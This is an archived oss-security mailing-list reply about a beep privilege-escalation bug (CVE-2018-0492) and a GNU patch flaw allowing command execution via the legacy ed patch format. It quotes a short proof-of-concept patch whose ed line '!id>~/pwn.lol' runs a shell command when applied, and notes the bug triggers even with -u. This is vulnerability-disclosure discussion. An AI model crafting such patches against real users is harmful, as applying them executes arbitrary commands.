X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["777" "Friday" "6" "April" "2018" "11:51:40" "+0200" "Jakub Wilk" "jwilk@jwilk.net" "<20180406095140.qhrrbwmwrir4nxhb@jwilk.net>" "26" "Re: [oss-security] Privsec vuln in beep / Code execution in GNU patch" nil nil nil "4" "2018040609:51:40" "[oss-security] Privsec vuln in beep / Code execution in GNU patch" (number mark "U       jwilk@jwilk. Apr  6   26/777   " thread-indent "\"Re: [oss-security] Privsec vuln in beep / Code execution in GNU patch\"\n") "<20180406085243.514739f2@pc1>" ("<20180406085243.514739f2@pc1>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13704 invoked by uid 550); 6 Apr 2018 09:51:55 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13680 invoked from network); 6 Apr 2018 09:51:55 -0000
Date: Fri, 6 Apr 2018 11:51:40 +0200
From: Jakub Wilk <jwilk@jwilk.net>
To: oss-security@lists.openwall.com
Message-ID: <20180406095140.qhrrbwmwrir4nxhb@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
References: <20180406085243.514739f2@pc1>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20180406085243.514739f2@pc1>
User-Agent: NeoMutt/20180323
X-Ovh-Tracer-Id: 4841088126372140966
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 7
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgedtgedrgeekgddvvdcutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfqggfjpdevjffgvefmvefgnecuuegrihhlohhuthemuceftddtnecufghrlhcuvffnffculdejmd
Subject: Re: [oss-security] Privsec vuln in beep / Code execution in GNU patch

* Hanno Böck <hanno@hboeck.de>, 2018-04-06, 08:52:
>There was a joke webpage about a vulnerability in beep a few days ago:
>http://holeybeep.ninja/
>There's also a corresponding Debian Advisory:
>https://lists.debian.org/debian-security-announce/2018/msg00089.html
>Neither have any technical details. CVE is CVE-2018-0492.
>
>If anyone knows the background of this please share it.

Upstream bug report:
https://github.com/johnath/beep/issues/11

>GNU patch supports a legacy "ed" format for patches and that allows 
>executing external commands.
[...]
>--- a	2018-13-37 13:37:37.000000000 +0100
>+++ b	2018-13-37 13:38:38.000000000 +0100
>1337a
>1,112d
>!id>~/pwn.lol

This bug triggers even with -u (which is supposed to disable patch type 
detection). :-/

-- 
Jakub Wilk
